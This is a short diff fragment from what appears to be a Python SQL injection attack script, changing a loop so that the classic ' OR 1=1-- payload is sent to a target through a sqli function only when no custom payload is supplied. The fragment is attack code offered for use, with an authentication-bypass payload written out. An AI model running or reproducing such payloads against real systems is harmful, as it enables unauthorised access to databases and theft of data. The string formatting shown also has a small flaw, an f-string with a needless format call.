@@ -43,6 +43,7 @@ def sqli(target, payload):
                 print("try something better")
 
 for i in range(1, 20):
-    payload = F"' OR 1=1--".format(i)
-    sqli(target, payload)
+    if not args.payload:
+        payload = F"' OR 1=1--".format(i)
+        sqli(target, payload)
 print(extract)
